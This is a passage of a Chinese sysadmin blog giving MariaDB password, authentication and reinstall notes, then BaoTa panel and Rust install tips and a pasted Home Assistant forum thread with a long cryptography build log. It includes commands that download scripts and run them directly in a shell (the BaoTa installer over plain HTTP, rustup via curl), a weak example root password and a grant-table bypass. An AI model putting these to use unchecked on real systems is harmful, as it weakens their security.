class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">flush privilieges;</span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用set指令设置root密码<br>登录数据库</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> password <span class="keyword">for</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span><span class="operator">=</span>password(<span class="string">&#x27;newpassword&#x27;</span>); </span><br><span class="line">exit; </span><br></pre></td></tr></table></figure>

<ol>
<li>忘记数据库root密码,则要跳过授权的方式启动mariadb以修改密码</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop mariadb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置跳过授权启动mariadb,然后登录数据库用2,3方法修改数据库密码</span></span><br><span class="line">mysqld_safe --skip-grant-tables &amp;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改密码后,跳权启动设置失效,设置正常启动mariadb</span></span><br><span class="line">systemctl start mariadb</span><br></pre></td></tr></table></figure>

<ol>
<li>修改登录mariadb的方式,从unix socket密码登录<br>Mariadb在5.2.0以后的版本默认不再使用密码认证了，改用Authentication Plugin - Unix Socket插件认证。而Unix Socke插件认证直接忽略密码. 通过以下方式可以切换回密码登录</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> plugin<span class="operator">=</span><span class="string">&#x27;mysql_native_password&#x27;</span> <span class="keyword">where</span> <span class="keyword">User</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove mariadb-client</span><br><span class="line">sudo apt-get autoremove mariadb-client</span><br><span class="line"> </span><br><span class="line">sudo apt-get remove mariadb-server</span><br><span class="line">sudo apt-get autoremove mariadb-server</span><br></pre></td></tr></table></figure>

<hr>
<p>分类: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/qinghemo/category/1574729.html">Database</a>, <a target="_blank" rel="noopener" href="https://www.cnblogs.com/qinghemo/category/1924375.html">Linux</a></p>
<h1 id="Kali-2019-4-下卸载并重新安装MySQL"><a href="#Kali-2019-4-下卸载并重新安装MySQL" class="headerlink" title="Kali 2019.4 下卸载并重新安装MySQL"></a>Kali 2019.4 下卸载并重新安装MySQL</h1><p>一、完全卸载Mysql</p>
<p>首先用 dpkg –list | grep mysql 查看自己的mysql有哪些依赖<br>卸载mysql相关应用   apt-get remove mysql*<br> 再用 dpkg –list|grep mysql 查看，还剩什么就卸载什么<br>最后清除残留数据：</p>
<p>dpkg -l | grep ^rc | awk ‘{print $2}’ | sudo xargs dpkg -P</p>
<p>保险起见再执行以下命令：</p>
<p>apt-get remove mariadb-client</p>
<p>apt-get autoremove mariadb-client</p>
<p>apt-get remove mariadb-server</p>
<p>apt-get autoremove mariadb-server</p>
<p>如果提示没有安装所以不用删除说明删干净了</p>
<p>二、安装Mariadb</p>
<p>这里因为kali的版本没有mysql的包，所以来安装Mariadb</p>
<p>apt-get install mariadb-client-10.3</p>
<p>apt-get install mariadb-server-10.3</p>
<p>如果不指定版本安装的就是最新的</p>
<p>之后输入vim /etc/mysql/my.cnf，添加以下内容：</p>
<p>[client-server]</p>
<p>port=3306</p>
<p>socket=/tmp/mysql.sock</p>
<p>[mysql]</p>
<p>#default-character-set=utf8</p>
<p>[mysqld]</p>
<p>basedir=/usr/local/mysql/</p>
<p>datadir=/usr/local/mysql/data/mysql</p>
<p>character-set-server=utf8</p>
<p>tmpdir=/tmp</p>
<p>:wq! 保存</p>
<p>然后配置mysql开机自启动, sudo systemctl enable mysql</p>
<pre><code>   启动mysql,   service mysql start
</code></pre>
<p>三、配置Mariadb数据库</p>
<p>命令行下输入mysql ，进入Mariadb命令行界面<br>show databases;<br>use mysql<br>show tables;<br>desc user;<br>select User, Host, Password from user;<br>为root用户设置密码 update user set Password=password(‘123456’) where User=’root’;<br>flush privileges;<br>Ctrl + D退出Mariadb命令行，验证密码是否设置成功<br>mysql -u root -p</p>
<p>Mariadb用户权限与管理【转】MariaDB/MySQL用户和权限管理<br>四、Mariadb密码无效</p>
<p>在新版的Mariadb安装过程中没有设置密码的过程了，而在命令行你发现直接用mysql就可以登录数据库，完全不用密码，然而你用其他的mysql管理工具使用密码无论如何都会提示 Access denied for user ‘root’@‘localhost’ 。</p>
<p>Mariadb在5.2.0以后的版本默认不再使用密码认证了，改用Authentication Plugin - Unix Socket插件认证。具体参考<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/">https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/</a></p>
<h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><p>​        虽然这是为了提高安全性，但有的地方我们必须使用密码认证登录，因此我们就要修改验证为密码的方式。直接在命令行输入 mysql 登录数据库。使用以下命令修改<br>​        use mysql;<br>​        update mysql.user set plugin=’mysql_native_password’ where User=’root’;<br>​        flush privileges;</p>
<h1 id="宝塔面板安装相关"><a href="#宝塔面板安装相关" class="headerlink" title="宝塔面板安装相关"></a>宝塔面板安装相关</h1><h2 id="问题相关"><a href="#问题相关" class="headerlink" title="问题相关"></a>问题相关</h2><p>wget -O install.sh <a target="_blank" rel="noopener" href="http://download.bt.cn/install/install-ubuntu_6.0.sh">http://download.bt.cn/install/install-ubuntu_6.0.sh</a> &amp;&amp; bash install.sh</p>
<p>出现ERROR：Failed building wheel for cryptography。。。尝试以下：</p>
<p>python的pip安装库到指定目录<br>pip install cryptography==36.0.1 –target=/www/server/panel/pyenv/lib/python3.7/site-packages</p>
<p>curl <a target="_blank" rel="noopener" href="https://sh.rustup.rs/">https://sh.rustup.rs</a> -sSf | sh<br>source $HOME/.cargo/env<br>rustc –version</p>
<p>export CRYPTOGRAPHY_DONT_BUILD_RUST=1<br>pip3 install –upgrade homeassistant</p>
<p><a target="_blank" rel="noopener" href="https://cryptography.io/en/latest/installation/#rust">https://cryptography.io/en/latest/installation/#rust</a></p>
<h2 id="ERROR-Failed-building-wheel-for-cryptography"><a href="#ERROR-Failed-building-wheel-for-cryptography" class="headerlink" title="ERROR: Failed building wheel for cryptography"></a><a target="_blank" rel="noopener" href="https://community.home-assistant.io/t/error-failed-building-wheel-for-cryptography/352020">ERROR: Failed building wheel for cryptography</a></h2><p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/trentjw">trentjw</a> (Trenton J Wilson)November 1, 2021, 2:30am#1</p>
<p>trying to update to latest version and this is the error I get<br>ERROR: Failed building wheel for cryptography<br>Failed to build cryptography<br>ERROR: Could not build wheels for cryptography, which is required to install pyproject.toml-based projects</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/koying">koying</a> (Chris B)November 1, 2021, 12:56pm#2</p>
<p>That issue, I guess:</p>
<p><img src="https://community.home-assistant.io/user_avatar/community.home-assistant.io/radu/40/152885_2.png" alt="img"> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/t/cannot-update-to-2021-10-0/344695">Cannot update to 2021.10.0</a> <a target="_blank" rel="noopener" href="https://community.home-assistant.io/c/installation/17">Installation</a></p>
<blockquote>
<p>I’m running HASS from a python env and i updated each time a new update came out however today i cannot update 2021.10.0. i get this after running python3 -m pip install –upgrade homeassistant in the correct container: error: can’t find Rust compiler If you are using an outdated pip version, it is possible a prebuilt wheel is available for this package but pip is not able to install from it. Installing from the wheel would avoid the need for a Rust compiler. To update pip, run: …</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/u/Piotr_Kowalski">Piotr_Kowalski</a> (Piotr Kowalski)November 6, 2021, 10:20am#3</p>
<p><a target="_blank" rel="noopener" href="https://community.home-assistant.io/t/cannot-update-to-2021-10-0/344695/1">Cannot update to 2021.10.0</a></p>
<blockquote>
<p>ython env and i updated each time a new update came out however today i cannot update 2021.10.0. i get this after running python3 -m pip install –upgrade homeassistant in the cor</p>
</blockquote>
<p>I have the same problem. The newest pip. I did everything from the instruction and still have:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">`Building wheels for collected packages: cryptography</span><br><span class="line">  Building wheel for cryptography (pyproject.toml) ... error</span><br><span class="line">  ERROR: Command errored out with exit status 1:</span><br><span class="line">   command: /srv/homeassistant/bin/python3.9 /srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpd9ajr6wm</span><br><span class="line">       cwd: /tmp/pip-install-04ynrnsi/cryptography_8e9ff41f16f041f0a756a1d3c41d0f24</span><br><span class="line">  Complete output (205 lines):</span><br><span class="line">  running bdist_wheel</span><br><span class="line">  running build</span><br><span class="line">  running build_py</span><br><span class="line">  creating build</span><br><span class="line">  creating build/lib.linux-armv7l-3.9</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  copying src/cryptography/__about__.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  copying src/cryptography/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  copying src/cryptography/fernet.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  copying src/cryptography/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  copying src/cryptography/exceptions.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/ocsp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/certificate_transparency.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/oid.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/general_name.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/extensions.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/name.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  copying src/cryptography/x509/base.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class="line">  copying src/cryptography/hazmat/_der.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class="line">  copying src/cryptography/hazmat/_oid.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class="line">  copying src/cryptography/hazmat/_types.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class="line">  copying src/cryptography/hazmat/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/hashes.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/_cipheralgorithm.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/padding.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/_serialization.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/hmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/keywrap.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/cmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/_asymmetric.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/constant_time.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  copying src/cryptography/hazmat/primitives/poly1305.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings</span><br><span class="line">  copying src/cryptography/hazmat/bindings/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/backends</span><br><span class="line">  copying src/cryptography/hazmat/backends/interfaces.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends</span><br><span class="line">  copying src/cryptography/hazmat/backends/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/kbkdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/hkdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/concatkdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/x963kdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/pbkdf2.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  copying src/cryptography/hazmat/primitives/kdf/scrypt.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/totp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/hotp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  copying src/cryptography/hazmat/primitives/twofactor/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/aead.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/modes.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/algorithms.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  copying src/cryptography/hazmat/primitives/ciphers/base.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/ed25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/dh.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/x25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/padding.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/rsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/ed448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/dsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/ec.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  copying src/cryptography/hazmat/primitives/asymmetric/x448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/pkcs7.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/base.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/ssh.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class="line">  copying src/cryptography/hazmat/primitives/serialization/pkcs12.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class="line">  copying src/cryptography/hazmat/bindings/openssl/binding.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class="line">  copying src/cryptography/hazmat/bindings/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class="line">  copying src/cryptography/hazmat/bindings/openssl/_conditional.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class="line">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ocsp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ed25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/hashes.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/dh.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/decode_asn1.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/x509.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/aead.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/x25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/backend.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/rsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ed448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/encode_asn1.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/hmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/dsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/cmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ec.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/poly1305.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/ciphers.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  copying src/cryptography/hazmat/backends/openssl/x448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class="line">  running egg_info</span><br><span class="line">  writing src/cryptography.egg-info/PKG-INFO</span><br><span class="line">  writing dependency_links to src/cryptography.egg-info/dependency_links.txt</span><br><span class="line">  writing requirements to src/cryptography.egg-info/requires.txt</span><br><span class="line">  writing top-level names to src/cryptography.egg-info/top_level.txt</span><br><span class="line">  reading manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class="line">  reading manifest template &#x27;MANIFEST.in&#x27;</span><br><span class="line">  no previously-included directories found matching &#x27;docs/_build&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;vectors&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;vectors&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.github&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;release.py&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;.coveragerc&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;codecov.yml&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;.readthedocs.yml&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;dev-requirements.txt&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;tox.ini&#x27;</span><br><span class="line">  warning: no previously-included files found matching &#x27;mypy.ini&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.d&#x27;</span><br><span class="line">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.playbooks&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE.APACHE&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE.BSD&#x27;</span><br><span class="line">  adding license file &#x27;LICENSE.PSF&#x27;</span><br><span class="line">  writing manifest file 